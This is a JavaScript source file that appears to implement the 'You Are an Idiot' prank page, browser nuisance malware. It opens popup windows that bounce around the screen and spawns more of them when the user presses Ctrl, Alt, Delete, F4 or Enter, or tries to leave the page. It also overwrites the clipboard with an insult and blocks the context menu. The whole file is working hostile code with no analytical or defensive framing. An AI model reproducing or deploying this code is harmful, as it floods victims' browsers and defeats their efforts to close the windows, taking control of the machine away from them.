"use strict";
function include(src) {
    var s = document.createElement("script");
    s.src = src;
    document.head.appendChild(s);
}
var WindowType;
(function (WindowType) {
    WindowType[WindowType["CHILD"] = 0] = "CHILD";
    WindowType[WindowType["PARENT"] = 1] = "PARENT";
})(WindowType || (WindowType = {}));
var windowType;
if (window.parentWindow) {
    windowType = WindowType.CHILD;
}
else {
    windowType = WindowType.PARENT;
}
var xOff = 5;
var yOff = 5;
var xPos = 400;
var yPos = -100;
var flagRun = true;
var isDevMode = false;
var children = [];
var functionsToRun = [];
var globalEval = window.eval;
function EvaluateInThisContext(aFunction) {
    aFunction.call(window);
}
document.oncopy = function (e) {
    try {
        e.clipboardData.setData("text/plain", "You are an idiot!");
    }
    catch (e) { }
};
function removeChild(aWindow) {
    children.splice(children.indexOf(aWindow), 1);
    aWindow.globalEval("window.parentWindow = null;");
}
function changeTitle(title) {
    document.title = title;
}
function openWindow(url) {
    var aWindow = window.open(url, "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
    aWindow.parentWindow = window;
    children.push(aWindow);
}
async function proCreate() {
    for (var i = 0; i < 5; i++) {
        openWindow('lol.html');
    }
}
function newXlt() {
    xOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}
function newXrt() {
    xOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}
function newYup() {
    yOff = Math.ceil(-6 * Math.random()) * 5 - 10;
    window.focus();
}
function newYdn() {
    yOff = Math.ceil(7 * Math.random()) * 5 - 10;
    window.focus();
}
function fOff() {
    flagRun = false;
}
function playBall() {
    xPos += xOff;
    yPos += yOff;
    if (xPos > screen.width - 357)
        newXlt();
    if (xPos < 0)
        newXrt();
    if (yPos > screen.height - 330)
        newYup();
    if (yPos < 0)
        newYdn();
    if (flagRun) {
        window.moveTo(xPos, yPos);
    }
}
function pasteIdiot() {
    var input = document.createElement("textarea");
    input.value = "You are an idiot!";
    document.body.appendChild(input);
    input.focus();
    input.select();
    document.execCommand("copy");
    input.remove();
}
function run() {
    setTimeout(run, 1);
    functionsToRun.forEach((func) => {
        func();
    });
}
functionsToRun.push(playBall);
window.onload = function () {
    flagRun = true;
    if (Time.dateIs(4, 1) || Time.dateIs(6, 25) || Time.dateIs(9, 11)) {
        window.location.replace(window.location.origin + "/spared.html");
    }
    declareEvents();
    document.getElementById("youare-video").oncontextmenu = (e) => e.preventDefault();
    run();
};
function isDeadlyKey(key) {
    key = key.toLowerCase();
    var keys = ["ctrl", "alt", "delete", "f4"];
    return keys.indexOf(key) != -1;
}
var oldClose = window.close;
window.close = function () {
    if (window.parentWindow) {
        window.parentWindow.removeChild(window);
    }
    oldClose.call(this);
};
function declareEvents() {
    window.onkeydown = function (e) {
        var key = e.key.toLowerCase();
        if (isDeadlyKey(key)) {
            if (isDevMode == true)
                return;
            proCreate();
            openWindow("message.html");
        }
        if (key == "enter") {
            proCreate();
            proCreate();
            proCreate();
            proCreate();
        }
        return;
    };
    if (/(lol\.html|message\.html)/g.test(window.location.href) || windowType == WindowType.CHILD) {
        window.onblur = function () {
            if (!isDevMode) {
                if (Time.dateIs(4, 1)) {
                    proCreate();
                }
            }
        };
    }
    window.onbeforeunload = function (evt) {
        if (isDevMode == true)
            return;
        setTimeout(proCreate, 0.00001);
        var e = evt || window.event, msg = "Are you sure you want to leave?";
        if (e.returnValue) {
            e.returnValue = msg;
        }
        return msg;
    };
}
